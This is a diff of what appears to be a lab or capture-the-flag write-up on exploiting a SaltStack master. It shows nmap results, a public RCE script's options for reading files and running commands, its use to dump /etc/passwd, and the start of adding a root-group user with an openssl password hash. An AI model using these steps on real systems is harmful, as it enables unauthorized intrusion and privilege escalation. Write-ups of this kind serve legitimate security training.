@@ -20,7 +20,7 @@ PORT     STATE SERVICE VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 406.01 seconds
 ```
-check the web and didn't have anything  
+check the web and didn't have anything    
 then search ztmp exploit got the RCE script
 ```
 google search zmtp 2.0 exploit
@@ -47,9 +47,10 @@ options:
   --exec EXEC           Run a command on the master
   --exec-all EXEC_ALL   Run a command on all minions
 ```
-It can read file, upload file and execute it
+It can read file, upload file and execute it  
 Try to read the /etc/passwd file and it works
-```─$ python3 48421.py --master 192.168.242.62 --port 4506 --read /etc/passwd                           
+```
+$ python3 48421.py --master 192.168.242.62 --port 4506 --read /etc/passwd                           
 [!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
 /usr/local/lib/python3.13/dist-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
   warn_until(
@@ -80,7 +81,7 @@ mezz:x:997:995::/home/mezz:/bin/false
 nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
 named:x:25:25:Named:/var/named:/sbin/nologin
 ```
-then try to add a user to the root groups and login
+then try to add a user to the root groups and login  
 openssl to create a password 
 ```
 $ openssl passwd password123
